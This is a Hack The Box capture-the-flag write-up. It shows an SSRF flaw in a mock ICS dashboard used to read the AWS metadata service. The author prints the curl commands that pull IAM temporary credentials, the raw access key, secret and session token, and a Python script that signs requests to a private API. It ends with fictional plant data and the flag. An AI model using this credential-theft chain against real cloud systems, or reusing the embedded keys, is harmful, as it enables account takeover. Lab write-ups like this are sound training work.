**Description:**  
After a relentless week-long effort, a lone Task Force operative successfully breached Volnaya's cloud-based ICS monitoring network, securing us permanent access to their front-end monitoring dashboard and opening a critical window into their industrial infrastructure. Your goal is to infiltrate deeper, locate sensitive data, and enable the Task Force to assume control of their core systems. IP: 3.15.107.79 

**HTB Difficulty Rating:** Very easy  
**How it felt:** WOOOH LIMITLESS PAIN!

# Steps taken
## Initial Recon and discovery:
Unfortunately, Shodan.io didn't have any information on this 3.15.107.79, but IP identified it as an Amazon AWS server. Launched community Burp Suite and browsed to 3.15.107.79 where a dashboard was presented. The Dashboard contained multiple blocks of information and an input button (Check Status).
![Visual ICS Monitoring Dashboard](Dashboard.png)  

When inspecting the response in HTTP History of Burp Suite, the button sends a POST request to https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status, leading to https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/, revealing https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private which unfortunately required an authentication token.
![Form](Form.png)   
![Private Endpoint API](Endpoints.png)

Tinkered with https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private in curl for a bit and eventually got stuck requiring a security token. Resulted in pivoting back to the Dashboard, and was curious to see what would happen if the URL was switched in the form to https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private. The result appeared to do something, combined with the alert (potential hint) previously on the dashboard about a successful SSRF attack led to 2 hours of research on SSRF.
![Modified_Form](Modified_Form.png)   
![Result](Result_Of_MF.png)

## Credential Gathering
**These next steps could be done using the form, but I found myself using curl instead.**   
**Fun Note:** AWS uses 169.254.169.254 as the metadata-IP where the metadata service can be accessed via http://169.254.169.254/latest/meta-data/ from the E2 instance.
1) Used ```curl -X POST http://3.15.107.79/ -d "url=https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status"``` to test curl and see what would happen to the output. The output appeared to be a huge chunk instead of nicely spread out. This led me to further investigate SSRF on http://3.15.107.79/
   
2) Next tried ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/"``` revealing the **iam/** metadata key. The goal was to extract the temporary security credentials from ```iam/security-credentials/role-name```.   
![I am](iam_exposed.png)   
3) Used ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"``` to get the role-name which was "APICallerRole"   
![Role Name](Role_Name.png)
4) To get the temp security credentials used ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/APICallerRole"```   
![Temp Sec Credentials](Temp_Sec_Credentials.png)

## Weaponization and Exploitation
### Weaponization / Development
After obtaining the credentials required for the private API, I used ChatGPT to generate a Python script and inserted the credentials.
```
import boto3
from requests_aws4auth import AWS4Auth
import requests

# Your temporary AWS credentials
access_key = 'ASIARHJJMXKM7VB6WSGA'
secret_key = '+PNRFMhw382toeluydRQeN9girE4D9vRxowQ8+aI'
session_token = 'IQoJb3JpZ2luX2VjEHMaCXVzLWVhc3QtMiJIMEYCIQCvftWUg4AhHx/15LCQafrpaeoZwBbvgQFPSX3HOExaQAIhAKwn5yfamtBf80+YN+29MPkJXLaSikN+Xtd0wb4hlTY+KrsFCD0QABoMMDg0Mzc1NTUwNjE3IgyaE1FWLosrxLScFcsqmAXrXwVZjkC/2B/+eMBO6cNEu55no1D+ZXz5ib6MBj74Xftd6OotJamMTz2+NRus9UgoPfiHP/12WQxfrbLbSsPQhF0ODGYfQzd5o6jWEMD9Y7YPaqkONBWkbQWWuzQqkIzPgeQ22ETslgG8+P8dmyRWXLrIGGKGN0FAS5060JD1CS2qPSI1xLJKny5PFlPkz/pEszqjMUsycDOI/iB3M8Go9B2OwblgTKXKqGbND4SetrhNzgB8nFq7nyxSddLKK0OFVSuME7qd8uVZCwV0gZG1yKjkyD+6XqvN+9ZJSO+oyMKoARCQOvmr+FqnNGhzVZJGuXONYpArNYNtkjzNMBBl3rwv01xQbDh57LIog3hARcHCbJdFEqj6cgv2X9lIY6g42Su2WPmNDDcf3frD5c49qK+jg3HUyj2kQ4/cb4p/HfvPa6pwhmVHtu9lr3ddLPhPBUBsFA9T98xgOYMBgoZEURB4o0uud1BFALta0VXpcw1irJZwame9CrIh3rOW0gexLzltY7SaG5vG+rkYyTAGTJCul4henxFt5dQZk+RYg3xKERvEtosK7+6itwX+eoWpoFNEbZJKFzhjqaPuza/+hSlQBtrHa9v8DhP6+c4IF8Anj/+kWJoBMpoC/uwvmzq8Vr2xlakSc35rJgsKbtD4ZdEPIdA2IR1VCStNyzlRz4LuPbwNOirGP8hKOARZo9wEsIR3mk1e/O1S+VrQ9ugV0PcaOroYP6zjy7mKZhoWvZpLCC3AM3mH30OBDvV1HyqZbXLcRUy12uDssGCpWIvFZmDXoAEUJT1CJ3UznuUuL27o6/SoNFOqYBpMVFpr11wv/d2jAkkxXOOSpg9uokYdIC/WPZJSe9u+d4B1b1xD6+qA1F+SDctFMKS9z8EGOrABamIrwc1bP1/b+fVkVFzPuUZq2B7nAXVeRqAb5Y5COPt7zVBs9xmDxkuzi3Cn0ra+Irc673FfVwRdis7O1a1VBhx1m1fo+hDGppivGeV/Wkc5q7Npgm3itlpi3zeEPETDhlKJXoEWXb5SY2cOYcU5dVbcGAdWWe59gLbCI5FqcefIOBD/qRvTnvRm+v/hkIRezG2z6liV79zDPghynnbFzqdIIOnYSz8XkGVsBf4u1pM='

region = 'us-east-2'
service = 'execute-api'
host = 'inyunqef0e.execute-api.us-east-2.amazonaws.com'
endpoint = f'https://{host}/api/private/'

# AWS4Auth object that will sign the request
awsauth = AWS4Auth(
    access_key,
    secret_key,
    region,
    service,
    session_token=session_token
)

# Make the GET request to your API Gateway endpoint with signed headers
response = requests.get(endpoint, auth=awsauth)

print("Status code:", response.status_code)
print("Response body:", response.text)
```
### Exploitation
Ran the python script and got the following output:
```
Status code: 200
Response body: [{"name": "Power Plant Zeta-7", "location": "Northern Province, Grid Sector 4", "operational_status": "Active", "critical_load": "75 MW", "backup_power_availability": "80%", "access_control_level": "Restricted Access (Level 3)", "emergency_shutdown_status": "Online", "encryption_key": "AES256-xyz123==", "admin_access_key": "PLANT-Z7-ADMLv3-2025", "sensor_id": "ZETA-7-SENSOR-001", "last_security_audit": "2025-04-15", "backup_power_system_id": "BPS-Z7-Backup-001"}, {"name": "Water Treatment Facility Delta-9", "location": "West River Basin, Region 3", "operational_status": "Active", "water_processing_capacity": "500,000 gallons/day", "pH_level_control": "Active, within range (7.2-7.5)", "chlorine_storage": "2000 kg", "backup_water_supply": "48 hours", "access_control_level": "Restricted Access (Level 2)", "cybersecurity_protocols": "SIEM Integration", "encryption_key": "RSA-2048-delta9secure", "admin_access_key": "WTFS-D9-ADMLv2-2025", "emergency_shutdown_key": "EMERGENCY-DELTA9-0001", "last_security_audit": "2025-05-02", "sensor_id": "DELTA9-CHLORINE-MONITOR"}, {"name": "Factory Alpha-12", "location": "Industrial Park B, Sector C", "operational_status": "Active", "production_volume": "1200 units/day", "critical_system_control": "PLC (Programmable Logic Controller)", "access_control_level": "Restricted Access (Level 1)", "security_measures": "VPN, IDS", "compliance_standards": "ISO 9001, OSHA", "encryption_key": "AES128-alpha12-secure", "admin_access_key": "FACTORY-A12-ADM-2025", "machine_control_id": "A12-MC-ID-987", "system_monitoring_key": "A12-SYS-KEY-2025", "last_security_audit": "2025-03-28"}, {"name": "Oil Refinery Sigma-15", "location": "Coastal City, Refining Zone 6", "operational_status": "Standby", "crude_oil_input_rate": "200,000 barrels/day", "output": ["Gasoline", "Diesel", "Jet Fuel"], "flare_system_status": "Online", "fire_suppression_system": "Automated, Chemical Based", "access_control_level": "Restricted Access (Level 4)", "disaster_recovery_plan": "Activated", "encryption_key": "AES256-oilref-secure15", "admin_access_key": "REF-SIGMA15-ADM-2025", "plant_shutdown_key": "SIGMA15-SHUT-KEY-01", "last_security_audit": "2025-02-10", "sensor_id": "SIGMA15-TEMPERATURE-SENSOR"}, {"name": "Nuclear Reactor Theta-8", "location": "Mountain Ridge, Reactor Zone 3", "operational_status": "Offline (Maintenance)", "reactor_core_temperature": "350°C (Nominal)", "core_fuel_status": "Uranium-235", "radiation_levels": "<10 µSv/hr", "critical_fail_safe_protocols": "Active", "access_control_level": "Restricted Access (Level 5)", "radiation_monitoring": "Active, Continuous", "encryption_key": "AES256-reactor-theta8-key", "admin_access_key": "NRC-THETA8-ADM-2025", "safety_shutdown_key": "SHUTDOWN-THETA-2025", "last_security_audit": "2025-01-22", "sensor_id": "THETA8-CORE-STATUS"}, {"flag": "HTB{d4sh1nG_tHr0ugH_DaSHbO4rDs}"}, {"name": "Hydroelectric Dam Beta-4", "location": "High River, Hydroelectric Zone 2", "operational_status": "Active", "water_flow_rate": "3000 cubic feet/second", "turbine_efficiency": "95%", "dam_integrity_status": "Stable", "backup_power_generation": "150 MW", "access_control_level": "Restricted Access (Level 3)", "flood_risk": "Minimal", "encryption_key": "AES256-dam-beta4-secure", "admin_access_key": "DAM-BETA4-ADM-2025", "dam_monitoring_key": "DAM-B4-MONITOR", "last_security_audit": "2025-04-01", "sensor_id": "BETA4-TURBINE-OUTPUT"}, {"name": "Smart Grid Hub Lambda-3", "location": "Central Hub, Grid Management Sector", "operational_status": "Active", "grid_frequency_stability": "60 Hz", "load_balancing_efficiency": "85%", "backup_power_systems": "100% Redundant", "cyber_defense_systems": "AI-Enhanced IDS", "access_control_level": "Restricted Access (Level 2)", "encryption_key": "AES256-smartgrid-lambda3", "admin_access_key": "SG-HUB-L3-ADM-2025", "network_monitoring_key": "SG-HUB-L3-MONITOR", "last_security_audit": "2025-03-12", "sensor_id": "LAMBDA3-NETWORK-SENSOR"}, {"name": "Chemical Plant Gamma-6", "location": "Industrial Complex D", "operational_status": "Active", "toxic_chemical_storage": "5000 liters (Acidic Compounds)", "air_quality_monitoring": "Sensors 
Active", "emergency_ventilation_system": "Automated, 99% Efficiency", "product_output": ["Fertilizers", "Polymers"], "access_control_level": "Restricted Access (Level 4)", "explosion_risk": "Monitored Continuously", "encryption_key": "RSA-2048-chemical-gamma6", "admin_access_key": "CHEM-GAMMA6-ADM-2025", "chemical_monitoring_key": "GAMMA6-CHEM-MONITOR", "last_security_audit": "2025-05-01", "sensor_id": "GAMMA6-ACID-SENSOR"}, {"name": "Data Center Pi-1", "location": "Downtown Data Hub", "operational_status": "Active", "server_load": "80% Capacity", "cooling_systems": "Operational", "power_supply_redundancy": "95%", "firewall_status": "Active, Layer 3 Filtering", "access_control_level": "Restricted Access (Level 2)", "encryption_key": "AES256-datacenter-pi1-secure", "admin_access_key": "DC-PI-1-ADM-2025", "data_backup_protocols": "Daily Snapshot", "last_security_audit": "2025-04-14", "sensor_id": "PI1-SERVER-TEMPERATURE"}]
```
# 🏁Flag 🏁
Inside the output was the flag ```HTB{d4sh1nG_tHr0ugH_DaSHbO4rDs}```
